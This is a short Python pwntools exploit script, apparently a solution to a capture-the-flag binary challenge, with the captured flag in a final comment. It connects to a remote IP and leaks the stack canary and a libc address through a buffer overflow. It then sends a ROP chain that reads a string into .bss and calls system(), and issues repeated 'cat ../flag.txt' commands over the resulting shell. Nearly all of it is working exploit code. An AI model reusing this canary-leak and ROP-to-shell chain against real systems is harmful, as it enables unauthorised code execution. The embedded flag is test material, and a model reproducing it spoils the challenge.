from pwn import *

elf = context.binary = ELF("chall")
libc = elf.libc
# p = process()
p = remote("34.45.81.67", 16006)

p.sendline("CHUNKS 10")
p.send(b"CHUNK 60 1 "+  cyclic(64 + 8) + b"1")
p.recvuntil(cyclic(64 + 8) + b"1")
canary =  u64(p.recv(7).ljust(8,b"\x00")) << 8
print("canary",hex(canary))



p.send(b"CHUNK 60 1 "+  cyclic(64 + 8 * 3))
p.recvuntil(cyclic(64 + 8 * 3))
libc_leak =  u64(p.recv(6).strip().ljust(8,b"\x00")) 
print(hex(libc_leak))
libc.address = libc_leak - 0x9caa4
print("libc.address",hex(libc.address))




rop = ROP(libc)
print(rop.rdi)
# gdb.attach(p,f"b *{rop.ret.address}")

syscall = libc.address + 0x13a1bb
# 0x00000000000b0133 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
rdx = libc.address + 0x00000000000b0133


p.send(b"CHUNK 0 1 "+  cyclic(64 + 8 * 1) + p64(canary) + b"A" * 8 + flat([
    rop.ret.address,
    rop.rax.address, 0,
    rop.rdi.address, 0,
    rop.rsi.address, elf.bss(0x200),
    rop.rbx.address, 0x100, 
    rdx, 0, 0 , 0,
    syscall,


    rop.ret.address,
    rop.rdi.address,
    elf.bss(0x200),
    libc.sym.system,
]))


p.recvuntil(cyclic(64 + 8 * 1))
p.sendline("cat ../flag.txt")
p.sendline("cat ../flag.txt")
p.sendline("cat ../flag.txt")
p.sendline("cat ../flag.txt")


p.interactive()

# L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}
